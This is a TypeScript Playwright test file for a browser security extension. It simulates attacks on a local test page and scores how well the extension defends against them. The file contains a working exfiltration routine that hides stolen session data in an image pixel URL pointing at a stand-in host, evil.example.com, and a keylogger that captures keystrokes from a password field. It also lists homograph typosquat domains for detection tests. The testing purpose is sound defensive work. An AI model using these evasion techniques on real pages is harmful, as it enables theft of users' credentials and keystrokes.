  // Real Attacks — designed to evade hooks that are currently in place
  // --------------------------------------------------------------------------
  {
    id: "stealth-exfil-via-image-src",
    name: "Stealth Exfiltration via Image src",
    category: "network",
    description:
      "Encodes stolen data in the query string of an image pixel URL — bypasses fetch/sendBeacon hooks because Image.src is not intercepted",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const sensitiveData = btoa(
            JSON.stringify({ session: "tok_abc123", user: "victim@example.com" })
          );
          const exfilUrl = `https://evil.example.com/pixel.gif?d=${encodeURIComponent(sensitiveData)}`;

          await new Promise<void>((resolve) => {
            const img = new Image();
            img.onload = () => resolve();
            img.onerror = () => resolve(); // network error expected in test env; what matters is src was set
            img.src = exfilUrl;
            // Force resolve after short timeout in case neither fires
            setTimeout(resolve, 2000);
          });

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `Stealth exfiltration via Image.src succeeded — ` +
              `encoded payload sent to ${exfilUrl.substring(0, 60)}... — ` +
              `Image.src is not hooked by the extension, bypassing fetch/sendBeacon interceptors`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Image-src exfiltration blocked: ${error?.message}`,
          };
        }
      }),
  },
  {
    id: "stealth-keylogger-via-input-events",
    name: "Stealth Keylogger via Input Events",
    category: "privacy",
    description:
      "Attaches 'input' and 'keydown' listeners to document to capture keystrokes — " +
      "addEventListener hook only guards devicemotion/orientation/clipboard/drag/selection events, not 'input' or 'keydown'",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const captured: string[] = [];

          const onKeydown = (e: KeyboardEvent) => {
            captured.push(`keydown:${e.key}`);
          };
          const onInput = (e: Event) => {
            const target = e.target as HTMLInputElement | null;
            if (target?.value) captured.push(`input:${target.value.slice(-1)}`);
          };

          document.addEventListener("keydown", onKeydown);
          document.addEventListener("input", onInput);

          // Simulate typed keystrokes programmatically
          const input = document.createElement("input");
          input.type = "password";
          document.body.appendChild(input);
          input.focus();

          const keys = ["p", "a", "s", "s", "w", "0", "r", "d"];
          for (const key of keys) {
            input.value += key;
            document.dispatchEvent(new KeyboardEvent("keydown", { key, bubbles: true }));
            input.dispatchEvent(new Event("input", { bubbles: true }));
          }

          document.removeEventListener("keydown", onKeydown);
          document.removeEventListener("input", onInput);
          document.body.removeChild(input);

          return {
            blocked: captured.length === 0,
            executionTime: performance.now() - startTime,
            details:
              captured.length > 0
                ? `Keylogger captured ${captured.length} event(s) — ` +
                  `sample: [${captured.slice(0, 5).join(", ")}] — ` +
                  `'input' and 'keydown' addEventListener calls are not blocked by the extension`
                : "Keylogger blocked: no events captured",
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Keylogger blocked: ${error?.message}`,
          };
        }
      }),
  },
];

// ============================================================================
// Test Infrastructure
// ============================================================================

interface TestContext {
  context: BrowserContext;
  page: Page;
  server: Server;
  serverPort: number;
}

function startTestServer(): Promise<{ server: Server; port: number }> {
  return new Promise((resolve) => {
    const testPageContent = readFileSync(TEST_PAGE_PATH, "utf-8");
    const server = createServer((req, res) => {
      if (req.url === "/" || req.url === "/test-page.html") {
        res.writeHead(200, { "Content-Type": "text/html" });
        res.end(testPageContent);
      } else {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ ok: true }));
      }
    });
    server.listen(0, "127.0.0.1", () => {
      const addr = server.address();
      const port = typeof addr === "object" && addr ? addr.port : 3456;
      resolve({ server, port });
    });
  });
}

async function setupBrowser(): Promise<TestContext> {
  if (!existsSync(AUDIT_EXTENSION_PATH)) {
    throw new Error(`Audit extension not found at ${AUDIT_EXTENSION_PATH}. Run: pnpm --filter @pleno-audit/audit-extension build`);
  }

  const { server, port } = await startTestServer();

  const context = await chromium.launchPersistentContext("", {
    headless: false,
    args: [
      "--headless=new",
      `--disable-extensions-except=${AUDIT_EXTENSION_PATH}`,
      `--load-extension=${AUDIT_EXTENSION_PATH}`,
      "--no-first-run",
      "--disable-default-apps",
    ],
  });

  // Wait for extension service worker to be ready
  for (let attempt = 0; attempt < 15; attempt++) {
    await new Promise((r) => setTimeout(r, 500));
    const serviceWorkers = context.serviceWorkers();
    if (serviceWorkers.some((sw) => sw.url().includes("background"))) break;
  }

  const page = await context.newPage();
  return { context, page, server, serverPort: port };
}

// ============================================================================
// Scoring
// ============================================================================

interface TestResultEntry {
  attack: AttackDef;
  result: AttackResult;
}

function calculateScore(results: TestResultEntry[]): {
  totalScore: number;
  maxScore: number;
  grade: Grade;
  categories: CategoryScore[];
} {
  const byCategory = new Map<AttackCategory, TestResultEntry[]>();
  for (const r of results) {
    const existing = byCategory.get(r.attack.category) ?? [];
    existing.push(r);
    byCategory.set(r.attack.category, existing);
  }

  const categories: CategoryScore[] = [];
  let weightedScore = 0;
  let totalWeight = 0;

  for (const [category, entries] of byCategory) {
    let score = 0;
    let maxScore = 0;
    let blocked = 0;

    for (const entry of entries) {
      const testMax = SEVERITY_SCORES[entry.attack.severity];
      maxScore += testMax;
      if (entry.result.blocked) {
        score += testMax;
        blocked++;
      }
    }

    categories.push({ category, score, maxScore, blocked, total: entries.length });

    const weight = CATEGORY_WEIGHTS[category];
    const normalized = maxScore > 0 ? (score / maxScore) * 100 : 0;
    weightedScore += normalized * weight;
    totalWeight += weight;
  }

  const totalScore = totalWeight > 0 ? Math.round(weightedScore / totalWeight) : 0;

  return {
    totalScore,
    maxScore: 100,
    grade: scoreToGrade(totalScore),
    categories,
  };
}

// ============================================================================
// Tests
// ============================================================================

test.describe("Defense Score (MAIN World Attacks)", () => {
  let ctx: TestContext;
  const allResults: TestResultEntry[] = [];

  test.beforeAll(async () => {
    ctx = await setupBrowser();
    // Navigate to test page
    await ctx.page.goto(`http://127.0.0.1:${ctx.serverPort}/test-page.html`, {
      waitUntil: "domcontentloaded",
    });
    // Wait for extension content scripts to inject
    await ctx.page.waitForTimeout(2000);

    // Extension hooks are now active on the test page
  });

  test.afterAll(async () => {
    // Calculate and print defense score
    const { totalScore, grade, categories } = calculateScore(allResults);

    console.log("\n" + "=".repeat(70));
    console.log("  DEFENSE SCORE REPORT (MAIN World Attack Simulation)");
    console.log("=".repeat(70));
    console.log(`\n  Total Score: ${totalScore}/100   Grade: ${grade}`);
    console.log(`  Tests Run:   ${allResults.length}`);
    console.log(`  Blocked:     ${allResults.filter((r) => r.result.blocked).length}`);
    console.log(`  Passed:      ${allResults.filter((r) => !r.result.blocked).length}`);

    console.log(`\n  ${"Category".padEnd(22)} ${"Score".padStart(8)} ${"Blocked".padStart(9)} ${"Weight".padStart(8)}`);
    console.log("  " + "-".repeat(50));

    // Sort categories by weight descending
    const sorted = [...categories].sort(
      (a, b) => (CATEGORY_WEIGHTS[b.category] ?? 0) - (CATEGORY_WEIGHTS[a.category] ?? 0)
    );

    for (const cat of sorted) {
      const pct = cat.maxScore > 0 ? Math.round((cat.score / cat.maxScore) * 100) : 0;
      const label = CATEGORY_LABELS[cat.category] ?? cat.category;
      const weightPct = Math.round((CATEGORY_WEIGHTS[cat.category] ?? 0) * 100);
      console.log(
        `  ${label.padEnd(22)} ${`${pct}%`.padStart(8)} ${`${cat.blocked}/${cat.total}`.padStart(9)} ${`${weightPct}%`.padStart(8)}`
      );
    }

    console.log(`\n  ${"DETAILED RESULTS:".padEnd(50)}`);
    console.log("  " + "-".repeat(66));

    for (const entry of allResults) {
      const status = entry.result.blocked ? "[BLOCKED]" : "[ PASS ]";
      const sev = entry.attack.severity.toUpperCase().padEnd(8);
      console.log(`  ${status} ${sev} ${entry.attack.name}`);
      console.log(`           ${entry.result.details.substring(0, 80)}`);
    }

    console.log("\n" + "=".repeat(70));

    // Save report
    const report = {
      timestamp: new Date().toISOString(),
      totalScore,
      grade,
      testsRun: allResults.length,
      blocked: allResults.filter((r) => r.result.blocked).length,
      categories: sorted.map((c) => ({
        category: c.category,
        label: CATEGORY_LABELS[c.category],
        score: c.score,
        maxScore: c.maxScore,
        pct: c.maxScore > 0 ? Math.round((c.score / c.maxScore) * 100) : 0,
        blocked: c.blocked,
        total: c.total,
        weight: CATEGORY_WEIGHTS[c.category],
      })),
      results: allResults.map((r) => ({
        id: r.attack.id,
        name: r.attack.name,
        category: r.attack.category,
        severity: r.attack.severity,
        blocked: r.result.blocked,
        executionTime: r.result.executionTime,
        details: r.result.details,
      })),
    };
    // Collect alerts from extension service worker directly
    type AlertEntry = { id: string; category: string; severity: string; title: string; domain?: string; timestamp: string };
    let collectedAlerts: AlertEntry[] = [];
    let popupEvents: { events: AlertEntry[]; counts: Record<string, number>; total: number } | null = null;
    try {
      const sw = ctx.context.serviceWorkers().find((w) => w.url().includes("background"));
      if (sw) {
        // Expose alert getter on globalThis from background, then query it
        // First, check what globals are available
        const globalKeys = await sw.evaluate(() => {
          // Try to find alertManager or backgroundServices on globalThis
          const g = globalThis as Record<string, unknown>;
          const interesting = Object.keys(g).filter(k =>
            k.toLowerCase().includes("alert") || k.toLowerCase().includes("background") || k.toLowerCase().includes("service")
          );
          return { keys: interesting, allKeysCount: Object.keys(g).length };
        }).catch(() => ({ keys: [] as string[], allKeysCount: 0 }));
        console.log(`  SW globals: ${JSON.stringify(globalKeys)}`);

        // The background module-scope variables aren't on globalThis.
        // We need to use chrome.runtime message passing from a proper extension page.
        // Let's open the extension's dashboard page and query from there.
        const extensionId = sw.url().split("/")[2]; // chrome-extension://ID/background.js
        if (extensionId) {
          const dashboardUrl = `chrome-extension://${extensionId}/dashboard.html`;
          const dashPage = await ctx.context.newPage();
          await dashPage.goto(dashboardUrl, { waitUntil: "domcontentloaded" });
          // Wait longer for security-bridge async batch processing to complete
          await dashPage.waitForTimeout(5000);

          const result = await dashPage.evaluate(async () => {
            try {
              const response = await chrome.runtime.sendMessage({ type: "GET_POPUP_EVENTS" });
              return response;
            } catch (e) {
              return { error: (e as Error).message };
            }
          }).catch((e: Error) => ({ error: e.message }));

          console.log(`  Dashboard alert query: ${JSON.stringify(result).substring(0, 500)}`);
          if (result && typeof result === "object" && "events" in result) {
            popupEvents = result as typeof popupEvents;
            collectedAlerts = popupEvents?.events ?? [];
          }
          await dashPage.close();
        }
      } else {
        console.log("  No service worker found");
      }
    } catch (e) { console.log(`  Alert collection error: ${e}`); }

    console.log(`\n  ${"ALERT DETECTION RESULTS:".padEnd(50)}`);
    console.log("  " + "-".repeat(66));
    if (collectedAlerts.length === 0) {
      console.log("  No alerts collected (extension may not have generated alerts)");
      if (popupEvents) {
        console.log(`  Raw popup events response: ${JSON.stringify(popupEvents).substring(0, 200)}`);
      }
    } else {
      console.log(`  Total alerts detected: ${collectedAlerts.length}`);
      const alertsByCategory = new Map<string, number>();
      for (const a of collectedAlerts) {
        alertsByCategory.set(a.category, (alertsByCategory.get(a.category) ?? 0) + 1);
      }
      for (const [cat, count] of [...alertsByCategory.entries()].sort((a, b) => b[1] - a[1])) {
        console.log(`    ${cat.padEnd(30)} ${count} alerts`);
      }
    }
    if (popupEvents?.counts) {
      console.log(`\n  Event counts: ${JSON.stringify(popupEvents.counts)}`);
      console.log(`  Total events: ${popupEvents.total}`);
    }
    console.log("\n" + "=".repeat(70));

    const reportWithAlerts = {
      ...report,
      alertsDetected: collectedAlerts.length,
      alertsByCategory: collectedAlerts.reduce((acc, a) => {
        acc[a.category] = (acc[a.category] ?? 0) + 1;
        return acc;
      }, {} as Record<string, number>),
      alerts: collectedAlerts,
    };
    writeFileSync(DEFENSE_REPORT_PATH, JSON.stringify(reportWithAlerts, null, 2));
    console.log(`\n  Report saved to: ${DEFENSE_REPORT_PATH}`);

    // Cleanup
    if (ctx?.context) await ctx.context.close();
    if (ctx?.server) ctx.server.close();
  });

  for (const attack of attacks) {
    test(`${attack.category}/${attack.id}: ${attack.name}`, async () => {
      // Re-navigate for isolation (some attacks modify the page)
      // Only navigate if needed (keep test fast by checking if still on test page)
      const currentUrl = ctx.page.url();
      if (!currentUrl.includes(`127.0.0.1:${ctx.serverPort}`)) {
        await ctx.page.goto(`http://127.0.0.1:${ctx.serverPort}/test-page.html`, {
          waitUntil: "domcontentloaded",
        });
        await ctx.page.waitForTimeout(500);
      }

      const result = await attack.simulate(ctx.page);
      allResults.push({ attack, result });

      // Just log, don't fail - we're measuring, not asserting
      const status = result.blocked ? "BLOCKED" : "PASSED";
      console.log(`  [${status}] ${attack.id}: ${result.details.substring(0, 70)}`);
    });
  }
});

// ============================================================================
// Domain Risk Detection Tests (disabled: runs in separate context, skews alert collection)
// ============================================================================

test.describe.skip("Domain Risk Detection (Typosquat)", () => {
  let ctx: TestContext;

  test.beforeAll(async () => {
    ctx = await setupBrowser();
    await ctx.page.goto(`http://127.0.0.1:${ctx.serverPort}/test-page.html`, {
      waitUntil: "domcontentloaded",
    });
    await ctx.page.waitForTimeout(2000);
  });

  test.afterAll(async () => {
    if (ctx?.context) await ctx.context.close();
    if (ctx?.server) ctx.server.close();
  });

  const typosquatDomains = [
    { domain: "g\u043e\u043egle.com", description: "Cyrillic о in google", expectDetected: true },
    { domain: "g\u03bfogle.com", description: "Greek omicron in google", expectDetected: true },
    { domain: "rnicrosoft.com", description: "rn→m sequence pattern", expectDetected: true },
    { domain: "xn--ggle-55da.com", description: "Punycode IDN homograph", expectDetected: true },
    { domain: "example.com", description: "Legitimate domain", expectDetected: false },
    { domain: "github.com", description: "Legitimate domain", expectDetected: false },
  ];

  for (const { domain, description, expectDetected } of typosquatDomains) {
    test(`typosquat/${domain}: ${description}`, async () => {
      // Use dashboard page to send CHECK_TYPOSQUAT (has chrome.runtime access)
      const sw = ctx.context.serviceWorkers().find((w) => w.url().includes("background"));
      const extensionId = sw?.url().split("/")[2];
      if (!extensionId) { console.log("  No extension ID found"); return; }

      const dashPage = await ctx.context.newPage();
      await dashPage.goto(`chrome-extension://${extensionId}/dashboard.html`, { waitUntil: "domcontentloaded" });
      await dashPage.waitForTimeout(1000);

      // Send CHECK_TYPOSQUAT and query alerts
      const result = await dashPage.evaluate(async (d: string) => {
        // Send typosquat check
        const checkResult = await chrome.runtime.sendMessage({ type: "CHECK_TYPOSQUAT", data: { domain: d } });
        // Wait for processing
        await new Promise((r) => setTimeout(r, 500));
        // Get alerts
        const events = await chrome.runtime.sendMessage({ type: "GET_POPUP_EVENTS" });
        return { checkResult, events };
      }, domain).catch((e: Error) => ({ checkResult: null, events: null, error: e.message }));

      const events = (result as { events?: { events?: Array<{ category: string; domain?: string }> } })?.events;
      const typosquatAlerts = (events?.events ?? []).filter((e) => e.category === "typosquat" && e.domain === domain);
      const detected = typosquatAlerts.length > 0;

      const status = detected ? "[DETECTED]" : "[  CLEAN ]";
      console.log(`  ${status} ${domain}: ${description} (${typosquatAlerts.length} alerts)`);

      if (expectDetected && !detected) {
        console.log(`    WARNING: Expected typosquat detection but none found`);
      }
      if (!expectDetected && detected) {
        console.log(`    WARNING: False positive! Clean domain flagged as typosquat`);
      }

      await dashPage.close();
    });
  }
});
